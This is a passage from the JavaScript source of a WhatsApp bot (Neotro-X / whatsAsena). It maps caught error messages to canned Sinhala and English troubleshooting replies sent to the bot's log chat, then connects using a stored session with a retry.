                                        '\n*🧚‍♂️විසඳුම:* _ඔබ English හෝඩියේ විධානය භාවිතා කළහොත් ගැටළුව විසඳනු ඇත._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ``` 🙇දෝශ විශ්ලේෂනය!``` ==========' +
                                        '\n\n*🚫ප්‍රධාන දෝෂය:* _Deleting Plugin_' +
                                        '\n*🤖හේතුව:* ප්ලගීනයෙ නම වැරදියි.._' +
                                        '\n*🧚‍♂️විසඳුම:* _ප්ලගීනයෙ නමට ඉදිරියෙන් මෙය හොදන්න_ *__* _නැතහොත් නමෙ අගට_ ```?(.*) / $``` _මේවා යොදන්න._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 කණගාටුයි AUTO ERROR පද්ධතියට හදුනාගත නොහැකියි! 🙇🏻*' +
                                        '\n_ඔබට පුලුවන් වැඩිදුර උදව් සදහා සහය සමූහයට ලිවීමට.._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, '*-- Bot Report [🎭Neotro-X] --*' + 
                                    '\n*🎭Neotro-X Working Perfectly!*'+
                                    '\n_This is Your LOG Number Dont try Command here.!_' +
                                    '\n_Also you can Join our Support group.._' +
                                    '\n_Support group_: https://chat.whatsapp.com/GTgqgMTo7FoJ1GqdijshsX' +
                                    '\n_(saved Messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (nmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [🎭Neotro-X] ⚕️*' + 
                                        '\n========== ```🙇ERROR ANALYSIS!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻Sorry, I Couldnt Read This Error!🙇🏻*' +
                                        '\n_You can write to our support groups for more help..._'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Restart Old version...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
